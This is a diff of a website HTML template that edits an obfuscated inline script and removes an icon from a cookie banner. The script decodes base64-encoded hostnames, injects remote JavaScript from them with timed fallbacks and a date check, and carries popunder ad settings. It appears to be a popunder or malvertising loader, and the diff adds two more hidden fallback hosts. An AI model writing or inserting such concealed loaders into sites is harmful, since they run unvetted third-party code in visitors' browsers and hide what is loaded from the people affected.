@@ -124,48 +124,50 @@
     <script type="text/javascript" data-cfasync="false">
       /*<![CDATA[/* */
       (function () {
-        var t = window,
-          m = "a5115968d6dc5498063ade1cef901f14",
-          v = [
-            ["siteId", 233 + 290 - 412 - 587 + 5062786],
-            ["minBid", 0.001],
-            ["popundersPerIP", "3:1,2:1"],
-            ["delayBetween", 25],
+        var k = window,
+          s = "a5115968d6dc5498063ade1cef901f14",
+          f = [
+            ["siteId", 727 - 290 + 315 + 5061558],
+            ["minBid", 0],
+            ["popundersPerIP", "0"],
+            ["delayBetween", 0],
             ["default", false],
-            ["defaultPerDay", 1],
+            ["defaultPerDay", 0],
             ["topmostLayer", !0],
           ],
-          w = [
-            "d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL3N0YXRpYy9udG9hc3RyLm1pbi5qcw==",
-            "ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvY3NzL2ltYWdlcy9zdGlueW5hdi5taW4uY3Nz",
+          v = [
+            "d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL3N0YXRpYy9ldG9hc3RyLm1pbi5qcw==",
+            "ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvY3NzL2ltYWdlcy9wdGlueW5hdi5taW4uY3Nz",
+            "d3d3LnVjZ3huc3RyLmNvbS9zdGF0aWMvcHRvYXN0ci5taW4uanM=",
+            "d3d3LnN0YWNja2Fpbi5jb20vY3NzL2ltYWdlcy9ydGlueW5hdi5taW4uY3Nz",
           ],
-          n = -1,
-          e,
-          s,
-          b = function () {
-            clearTimeout(s);
-            n++;
-            if (w[n] && !(1730992787000 < new Date().getTime() && 1 < n)) {
-              e = t.document.createElement("script");
-              e.type = "text/javascript";
-              e.async = !0;
-              var q = t.document.getElementsByTagName("script")[0];
-              e.src = "https://" + atob(w[n]);
-              e.crossOrigin = "anonymous";
-              e.onerror = b;
-              e.onload = function () {
-                clearTimeout(s);
-                t[m.slice(0, 16) + m.slice(0, 16)] || b();
+          w = -1,
+          d,
+          y,
+          e = function () {
+            clearTimeout(y);
+            w++;
+            if (v[w] && !(1731176188000 < new Date().getTime() && 1 < w)) {
+              d = k.document.createElement("script");
+              d.type = "text/javascript";
+              d.async = !0;
+              var a = k.document.getElementsByTagName("script")[0];
+              d.src = "https://" + atob(v[w]);
+              d.crossOrigin = "anonymous";
+              d.onerror = e;
+              d.onload = function () {
+                clearTimeout(y);
+                k[s.slice(0, 16) + s.slice(0, 16)] || e();
               };
-              s = setTimeout(b, 5e3);
-              q.parentNode.insertBefore(e, q);
+              y = setTimeout(e, 5e3);
+              a.parentNode.insertBefore(d, a);
             }
           };
-        if (!t[m]) {
+        if (!k[s]) {
           try {
-            Object.freeze((t[m] = v));
+            Object.freeze((k[s] = f));
           } catch (e) {}
-          b();
+          e();
         }
       })();
       /*]]>/* */
@@ -205,7 +207,7 @@
       <div class="cookie-info-bar">
         <div class="container">
           <div class="cookie-info-bar_title">
-            <i class="fal fa-cookie"></i>We use cookies to improve our services
+            We use cookies to improve our services
             and performance. Learn more about our use of cookies:
             <a href="{% url 'privacy' %}">Cookie policy</a>
           </div>
